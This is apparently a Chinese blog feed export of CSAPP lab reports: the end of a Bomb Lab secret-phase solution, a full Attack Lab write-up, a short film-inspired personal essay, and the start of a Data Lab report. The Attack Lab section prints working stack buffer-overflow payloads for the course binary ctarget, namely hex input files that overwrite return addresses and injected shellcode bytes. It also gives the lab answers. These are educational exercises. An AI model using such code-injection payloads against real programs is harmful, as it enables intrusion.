<h5 id="825-确定输入的整数"><a class="markdownIt-Anchor" href="#825-确定输入的整数"></a> 8.2.5 确定输入的整数</h5>
<p>接下来，使用 gdb 查看作为参数传入的地址 <code>0x6030f0</code> 开始的连续内存中的值（经试验可知第 60 个 8 bytes 之后的地址中存放的都是无关数据，因此这里只需显示前 60 个地址）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x2F;60xg 0x6030f0</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6030f0 &lt;n1&gt;:   0x0000000000000024      0x0000000000603110</span><br><span class="line">0x603100 &lt;n1+16&gt;:        0x0000000000603130       0x0000000000000000</span><br><span class="line">0x603110 &lt;n21&gt;:  0x0000000000000008      0x0000000000603190</span><br><span class="line">0x603120 &lt;n21+16&gt;:       0x0000000000603150       0x0000000000000000</span><br><span class="line">0x603130 &lt;n22&gt;:  0x0000000000000032      0x0000000000603170</span><br><span class="line">0x603140 &lt;n22+16&gt;:       0x00000000006031b0       0x0000000000000000</span><br><span class="line">0x603150 &lt;n32&gt;:  0x0000000000000016      0x0000000000603270</span><br><span class="line">0x603160 &lt;n32+16&gt;:       0x0000000000603230       0x0000000000000000</span><br><span class="line">0x603170 &lt;n33&gt;:  0x000000000000002d      0x00000000006031d0</span><br><span class="line">0x603180 &lt;n33+16&gt;:       0x0000000000603290       0x0000000000000000</span><br><span class="line">0x603190 &lt;n31&gt;:  0x0000000000000006      0x00000000006031f0</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:       0x0000000000603250       0x0000000000000000</span><br><span class="line">0x6031b0 &lt;n34&gt;:  0x000000000000006b      0x0000000000603210</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:       0x00000000006032b0       0x0000000000000000</span><br><span class="line">0x6031d0 &lt;n45&gt;:  0x0000000000000028      0x0000000000000000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x6031f0 &lt;n41&gt;:  0x0000000000000001      0x0000000000000000</span><br><span class="line">0x603200 &lt;n41+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603210 &lt;n47&gt;:  0x0000000000000063      0x0000000000000000</span><br><span class="line">0x603220 &lt;n47+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603230 &lt;n44&gt;:  0x0000000000000023      0x0000000000000000</span><br><span class="line">0x603240 &lt;n44+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603250 &lt;n42&gt;:  0x0000000000000007      0x0000000000000000</span><br><span class="line">0x603260 &lt;n42+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603270 &lt;n43&gt;:  0x0000000000000014      0x0000000000000000</span><br><span class="line">0x603280 &lt;n43+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603290 &lt;n46&gt;:  0x000000000000002f      0x0000000000000000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x6032b0 &lt;n48&gt;:  0x00000000000003e9      0x0000000000000000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:       0x0000000000000000       0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>结合 8.2.4 节译出的函数 <code>fun7</code> 代码，可以发现这是一个二叉树。二叉树中每个结点是一个结构体，结点所在的地址指向的是数据 <code>val</code>，加上 <code>0x8</code> 后指向的是指针 <code>left</code>，加上 <code>0x10</code> 后指向的是指针 <code>right</code>。</p>
<p>因此，<code>fun7</code> 函数中的 <code>*p_node</code> 即 <code>p_node-&gt;val</code>，<code>*(p_node + 1)</code> 即 <code>p_node-&gt;left</code>，<code>*(p_node + 2)</code> 即 <code>p_node-&gt;right</code>。</p>
<p>根据之前 gdb 的输出信息绘制二叉树（数据已转化为十进制）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">            36</span><br><span class="line">         ／        ＼</span><br><span class="line">      8               50</span><br><span class="line">   ／   ＼          ／   ＼</span><br><span class="line">  6      22       45      107</span><br><span class="line"> &#x2F; \    &#x2F;  \     &#x2F;  \    &#x2F;   \</span><br><span class="line">1   7  20  35   40  47  99  1001</span><br></pre></td></tr></table></figure>
<p>可以发现这其实是一个 BST（Binary Search Tree，二叉查找树），而函数 <code>fun7</code> 的作用为：</p>
<ol>
<li>如果当前结点为 <code>NULL</code>，则返回 <code>0xffffffff</code>（直接爆了）；</li>
<li>如果找到了 <code>target</code>，则返回 <code>0</code>；</li>
<li>如果当前结点的值大于 <code>target</code>，则继续搜索左子树，返回时将左子树的返回值 <code>* 2</code>；</li>
<li>如果当前结点的值小于 <code>target</code>，则继续搜索右子树，返回时将右子树的返回值 <code>* 2 + 1</code>。</li>
</ol>
<p>起始时从根结点 <code>36</code> 开始查找，现在问题转化为：求 <code>target</code> 为何值时，最终的返回值为 <code>2</code>。</p>
<p>由之前的分析，返回值为 <code>2</code> 的条件为：</p>
<ol>
<li>最终找到 <code>target</code> 的值（<code>return 0</code>），此后可以沿右路返回任意次（<code>return 0</code>）；</li>
<li>然后沿左路返回（<code>return 1</code>）；</li>
<li>最后沿右路返回（<code>return 2</code>）。</li>
</ol>
<p>满足条件的结点的值有 2 个：<code>22</code>, <code>20</code>，即为所求。</p>
<p>于是得到本关的 2 个解：<code>22</code>, <code>20</code>。</p>
<h5 id="826-测试"><a class="markdownIt-Anchor" href="#826-测试"></a> 8.2.6 测试</h5>
<p>这里以 <code>22</code> 为例，在 gdb 中输入 Secret phase 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12Wow! You&#39;ve defused the secret stage!</span><br><span class="line">Congratulations! You&#39;ve defused the bomb!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Attack Lab实验报告</title>
    <url>/2020/04/02/1/</url>
    <content><![CDATA[<p><img src="/2020/04/02/1/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-attack-lab-解题报告"><a class="markdownIt-Anchor" href="#csapp-attack-lab-解题报告"></a> CSAPP Attack Lab 解题报告</h1>
<h2 id="level1"><a class="markdownIt-Anchor" href="#level1"></a> Level1:</h2>
<h3 id="目标执行touch1函数"><a class="markdownIt-Anchor" href="#目标执行touch1函数"></a> 目标：执行touch1函数：</h3>
<p>在本题的讲义中给出了<code>getbuf</code>、<code>test</code>和<code>touch1</code>三个函数的C语言描述：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该题的意图是我们应当利用<code>getbuf</code>中的缓冲区溢出漏洞使得执行<code>getbuf</code>之后重定向至<code>touch1</code>即可。因此我们需要确定<code>BUFFER_SIZE</code>的大小以及<code>touch1</code>函数所在的地址。</p>
<h4 id="首先反编译ctarget"><a class="markdownIt-Anchor" href="#首先反编译ctarget"></a> 首先反编译ctarget</h4>
<p>在Linux上使用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.asm</span><br></pre></td></tr></table></figure>
<p>将<code>ctarget</code>反汇编成<code>ctarget.asm</code></p>
<h4 id="在ctarget上搜索touch1函数以及getbuf函数可以使用编辑器代码搜索功能"><a class="markdownIt-Anchor" href="#在ctarget上搜索touch1函数以及getbuf函数可以使用编辑器代码搜索功能"></a> 在ctarget上搜索touch1函数以及getbuf函数（可以使用编辑器代码搜索功能）</h4>
<p>可以发现getbuf的汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:  48 83 ec 28            sub    $0x28,%rsp</span><br><span class="line">  4017ac:  48 89 e7               mov    %rsp,%rdi</span><br><span class="line">  4017af:  e8 ac 03 00 00         callq  401b60 &lt;Gets&gt;</span><br><span class="line">  4017b4:  b8 01 00 00 00         mov    $0x1,%eax</span><br><span class="line">  4017b9:  48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">  4017bd:  c3                     retq   </span><br><span class="line">  4017be:  90                     nop</span><br><span class="line">  4017bf:  90                     nop</span><br></pre></td></tr></table></figure>
<p>从这里我们可以观察到<code>getbuf</code>函数首先执行了将rsp寄存器减去0x28这个操作，即将栈顶指针向下移40个比特位，因此我们可以推断出<code>BUFFER_SIZE</code>的大小为40。</p>
<p>之后我们可以同样使用这种方法搜索touch1函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  4017c4:  c7 05 0e 3d 20 00 01   movl   $0x1,0x203d0e(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:  00 00 00 </span><br><span class="line">  4017ce:  bf e5 31 40 00         mov    $0x4031e5,%edi</span><br><span class="line">  4017d3:  e8 e8 f4 ff ff         callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  4017dd:  e8 cb 05 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  4017e2:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  4017e7:  e8 54 f6 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>在该段汇编代码中，我们同样可以看出touch1函数的地址为0x4017c0。</p>
<p>因此编写输入数据就简单了。</p>
<p>首先打开一个文件写入数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim touch1.txt</span><br></pre></td></tr></table></figure>
<p>编辑文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>
<p>前40位可以任意填充，在40位后即为缓存区溢出位，这里压入的是函数返回地址，因此将<code>touch1</code>函数的地址写入即可在<code>ret</code>之后返回至<code>touch1</code>函数并执行。</p>
<p>最终我们使用hex2raw工具执行代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat touch1.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p>最终运行结果如下：</p>
<p><img src="/2020/04/02/1/level1.png" alt></p>
<h2 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> Level2:</h2>
<h3 id="目标执行函数touch2并传入cookie的值作为参数val"><a class="markdownIt-Anchor" href="#目标执行函数touch2并传入cookie的值作为参数val"></a> 目标：执行函数touch2,并传入cookie的值作为参数val</h3>
<p>同样，在本题中也给出了<code>touch2</code>的函数实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过在反汇编中寻找<code>touch2</code>代码，我们发现<code>touch2</code>的汇编语言如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  4017f0:  89 fa                  mov    %edi,%edx</span><br><span class="line">  4017f2:  c7 05 e0 3c 20 00 02   movl   $0x2,0x203ce0(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:  00 00 00 </span><br><span class="line">  4017fc:  3b 3d e2 3c 20 00      cmp    0x203ce2(%rip),%edi        # 6054e4 &lt;cookie&gt;</span><br><span class="line">  401802:  75 20                  jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:  be 08 32 40 00         mov    $0x403208,%esi</span><br><span class="line">  401809:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40180e:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  401813:  e8 d8 f5 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:  bf 02 00 00 00         mov    $0x2,%edi</span><br><span class="line">  40181d:  e8 8b 05 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  401822:  eb 1e                  jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:  be 30 32 40 00         mov    $0x403230,%esi</span><br><span class="line">  401829:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40182e:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  401833:  e8 b8 f5 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:  bf 02 00 00 00         mov    $0x2,%edi</span><br><span class="line">  40183d:  e8 2d 06 00 00         callq  401e6f &lt;fail&gt;</span><br><span class="line">  401842:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  401847:  e8 f4 f5 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>同样，我们找到了<code>touch2</code>函数的地址为<code>0x4017</code>。</p>
<p>由于本题需要在<code>touch2</code>中传入<code>cookie</code>参数才能执行成功，因此我们需要在输入文件中注入代码，并且将函数返回地址修改为代码注入的地址以实现代码注入攻击，因此我们需要知道<code>getbuf</code>函数栈顶地址（因为在此处我们需要注入代码）。</p>
<p>使用GDB调试一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line"></span><br><span class="line">(gdb) set args -q</span><br><span class="line"></span><br><span class="line">(gdb) b getbuf</span><br><span class="line"></span><br><span class="line">(gdb) r </span><br><span class="line"></span><br><span class="line">(gdb) ni </span><br><span class="line"></span><br><span class="line">(gdb) p/x $rsp</span><br></pre></td></tr></table></figure>
<p>在命令行中我们调试ctarget程序并且在getbuf函数上打断点，在<code>getbuf</code>执行一步过后，即<code>sub $0x28 ,%rsp</code>之后我们查看<code>$rsp</code>寄存器的值，输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
<p>接下来我们使用vim编辑注入汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi</span><br><span class="line">push   $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>然后将汇编代码后编译后再进行反编译以获取机器代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c touch2.s</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d touch2.o</span><br></pre></td></tr></table></figure>
<p>然后可以获取<code>touch2</code>的机器级代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 </span><br><span class="line"></span><br><span class="line">68 ec 17 40 00</span><br><span class="line"></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
<p>基于以上的信息我们就可以编辑输入文件了！</p>
<p>输入文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>在栈顶进行代码注入，同时在溢出去返回栈顶地址。</p>
<p>使用<code>hex2raw</code>进行输入。</p>
<p>结果如下：</p>
<p><img src="/2020/04/02/1/level2.png" alt></p>
<h2 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> level3:</h2>
<h3 id="目标执行函数touch3并传入cookie的值的字符串作为参数sval"><a class="markdownIt-Anchor" href="#目标执行函数touch3并传入cookie的值的字符串作为参数sval"></a> 目标：执行函数touch3，并传入cookie的值的字符串作为参数sval</h3>
<p>与level2类似，区别在于我们这次需要构造一个字符串，而不是直接传一个整数，需要注意字符串保存位置。</p>
<p>讲义给出了<code>hexmatch</code>和<code>touch3</code>的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见需要传入表示 <code>cookie</code> 的值的字符串作为参数 <code>sval</code>。同时函数 <code>hexmatch</code> 的设计使得直接获取用于检验的字符串较为困难，因此我们需要自行构造这个字符串。</p>
<p>因此我们需要查看touch3的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:  53                     push   %rbx</span><br><span class="line">  4018fb:  48 89 fb               mov    %rdi,%rbx</span><br><span class="line">  4018fe:  c7 05 d4 3b 20 00 03   movl   $0x3,0x203bd4(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  401905:  00 00 00 </span><br><span class="line">  401908:  48 89 fe               mov    %rdi,%rsi</span><br><span class="line">  40190b:  8b 3d d3 3b 20 00      mov    0x203bd3(%rip),%edi        # 6054e4 &lt;cookie&gt;</span><br><span class="line">  401911:  e8 36 ff ff ff         callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:  85 c0                  test   %eax,%eax</span><br><span class="line">  401918:  74 23                  je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:  48 89 da               mov    %rbx,%rdx</span><br><span class="line">  40191d:  be 58 32 40 00         mov    $0x403258,%esi</span><br><span class="line">  401922:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  401927:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40192c:  e8 bf f4 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:  bf 03 00 00 00         mov    $0x3,%edi</span><br><span class="line">  401936:  e8 72 04 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  40193b:  eb 21                  jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:  48 89 da               mov    %rbx,%rdx</span><br><span class="line">  401940:  be 80 32 40 00         mov    $0x403280,%esi</span><br><span class="line">  401945:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40194a:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40194f:  e8 9c f4 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:  bf 03 00 00 00         mov    $0x3,%edi</span><br><span class="line">  401959:  e8 11 05 00 00         callq  401e6f &lt;fail&gt;</span><br><span class="line">  40195e:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  401963:  e8 d8 f4 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>touch3的汇编代码如上所示，了解到<code>touch3</code>的地址为<code>0x4018fa</code>，因此我们可以基于此地址构造注入代码。在写注入代码前我们还需要了解到<code>cookie</code>数值的字符串表示，以及该字符串在栈中存放位置。</p>
<p>其中cookie的字符串表示可以通过查询ASCII码表或者使用高级语言输出来获得。</p>
<p>关于字符串在栈中的存放位置，我们可以试想一下，如果将cookie字符串的编码放在返回地址下面的时候，当我们<code>return</code>至<code>touch3</code>所在函数时会进行数据的入栈，因此当从栈中地址取出字符串参数时，该字符串已经被破坏掉了，因此我们需要将cookie字符串放在return地址的上面，为了安全起见，我们将<code>cookie</code>的值设置为<code>%rsp+48</code>的位置。</p>
<p>接下来编辑汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x5561dca8,%rdi</span><br><span class="line">push $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>其中<code>0x5561dca8</code>这个地址是将栈顶指针加上48得到的。</p>
<p>之后，同level2一样，我们对注入代码进行汇编、反汇编获取机器码，这里不再赘述。</p>
<p>获取到的机器码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line"></span><br><span class="line">68 fa 18 40 00</span><br><span class="line"></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
<p>在之后我们就可以编写输入文件了。</p>
<p>输入文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8</span><br><span class="line">dc 61 55 68</span><br><span class="line">fa 18 40 00</span><br><span class="line">c3 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br></pre></td></tr></table></figure>
<p>然后继续使用<code>hex2raw</code>工具进行输入。</p>
<p>输入结果如下：</p>
<p><img src="/2020/04/02/1/level3.png" alt></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>伴随岁月流逝的“严谨”</title>
    <url>/2020/03/27/1/</url>
    <content><![CDATA[<p>两周以前我看了《大赢家》这部电影，想写些东西，奈何太忙而被搁置了，现在我的感受已经只剩那么零零星星的一点了，但我依然想把它们记录下来。说实话，其实《大赢家》这部电影并不能算是好的电影，但是主人公的形象是十分特别的，因为他总能让我想起我年轻的时候（大概是我上小学的时候）。</p>
<a id="more"></a>
<p>那时的我简直和故事的主人公一模一样，倒不是说做事严谨，就是对每件事情都很认真对待。举几个我到现在还记忆清晰的例子来说明一下。当时我上小学三年级，老师在前面写板书，让我们安静看书，可是不一会儿全班的同学就开始交头接耳，然后就喧嚷起来。于是我就忍不了了，当时我把老师的话看做圣旨，觉得那些不听老师话的都是坏孩子。然后我大喊了一声“别吵了！”，我的嗓门很大，我喊完以后全班就没一个人说话了，因为他们惊呆了，没有人会想到我敢干出这种事。可是结果怎么样呢？我被老师教训了，我不是班长，不是纪律委员，却越俎代庖地干了他们该干的事，结果我被训了，我认为我的出发点是好的，但是因为我这一行为遭到了几乎所有人的“不理解”与“偏见”，所以之后我就再也不干这种事了。</p>
<p>还有一件事是，在一次语文默写课文的时候，我发现我旁边的两位同学正在“作弊”，于是我就又忍不了了，我就告诉她们我要去老师那里告发她们，她们很慌张，于是拿出“火腿肠”来贿赂我，但是我没有接受（其实我是回族，接受了也不能吃），但是我忘记了为什么我最终也没有告发她们，也许当时我已经发现这种对待事情特别“较真”的态度其实不管放到哪个圈子里都是行不通的，因为他们其实并不把这叫做“认真”，而是叫做“情商低”、“爱较真”。</p>
<p>于是我也沦落到现在这样了，我也经常“作弊”，并且不再把这些看做什么了不得的事，因为我身边的人都是这么做的。但其实我内心是真的厌恶某些人、某些事情，但我不会这么勇敢地表达出来了。因为我害怕被那些人情世故所撕碎，被那些圈子所排斥。其实我更多地发现，我们每个人外面都披着一层“皇帝的新衣”，我们有一肚子的实话想对一些人讲出来，但我们不会讲。</p>
<p>因为恐惧…</p>
]]></content>
      <categories>
        <category>电影</category>
      </categories>
      <tags>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>Data Lab实验报告</title>
    <url>/2020/03/10/1/</url>
    <content><![CDATA[<p><img src="/2020/03/10/1/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-data-lab实验报告"><a class="markdownIt-Anchor" href="#csapp-data-lab实验报告"></a> CSAPP Data Lab实验报告</h1>
<h5 id="1isasciidightint-x"><a class="markdownIt-Anchor" href="#1isasciidightint-x"></a> 1.<code>isAsciiDight(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isAsciiDigit(int x) &#123;</span><br><span class="line">    return(!((x+~48+1)&gt;&gt;31))&amp;!!((x+~58+1)&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>题目要求当参数x大于等于48小于等于57的时候返回1，否则返回0。</p>
<p>于是我们将x减去48并将其右移31位保留其符号位，此时若x减去48大于等于0则符号位为0因此要将其进行取反；同样，将x减去58并将其右移31位，此时真好同上面那种情况相反，因此要对符号位取两次反，最后再取与运算获得结果。</p>
<h5 id="2-int-anyevenbitint-x"><a class="markdownIt-Anchor" href="#2-int-anyevenbitint-x"></a> 2. <code>int anyEvenBit(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int anyEvenBit(int x) &#123;</span><br><span class="line">    int t&#x3D;0x55 | (0x55&lt;&lt;8);</span><br><span class="line">    int mask&#x3D;t | (t&lt;&lt;16);</span><br><span class="line">    return !!(x&amp;mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>题目要求当参数x有任何偶数位设置为1时返回1，否则返回0。</p>
<p>因此我们构造一个掩码，令该掩码的偶数位全为1，奇数位全为0，再令输入的参数x和该掩码进行与运算，若x中有偶数位被设置为1的话则与之后必不为0，因此两次取反返回。</p>
<h5 id="3-int-copylsbint-x"><a class="markdownIt-Anchor" href="#3-int-copylsbint-x"></a> 3. <code>int copyLSB(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int copyLSB(int x) &#123;</span><br><span class="line">    return ((x&lt;&lt;31)&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>本题要求设置所有位为参数x的最低位，所以先左移31位再右移31位进行符号位扩展。</p>
<h5 id="4-int-leastbitposint-x"><a class="markdownIt-Anchor" href="#4-int-leastbitposint-x"></a> 4. <code>int leastBitPos(int x)</code></h5>
<p><strong>实现代码：</strong></p>
